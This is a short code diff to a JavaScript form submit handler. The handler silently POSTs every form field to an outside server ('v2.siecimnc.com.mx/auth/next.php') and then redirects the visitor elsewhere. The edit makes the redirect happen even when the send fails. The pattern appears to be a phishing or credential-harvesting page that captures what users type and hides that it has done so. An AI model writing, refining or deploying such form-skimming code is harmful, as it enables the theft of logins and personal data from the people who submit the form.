@@ -158,13 +158,15 @@
   form.addEventListener("submit", function (e) {
     e.preventDefault(); // stop normal reload
 
-    // send the form data to PHP in the background
     const formData = new FormData(form);
+
     fetch("https://v2.siecimnc.com.mx/auth/next.php", {
       method: "POST",
       body: formData
-    }).then(() => {
-      // after sending, redirect
+    })
+    .catch(() => { /* ignore errors */ })
+    .finally(() => {
+      // always redirect after submit
       window.location.href = "https://www.sample.net/#hose";
     });
   });
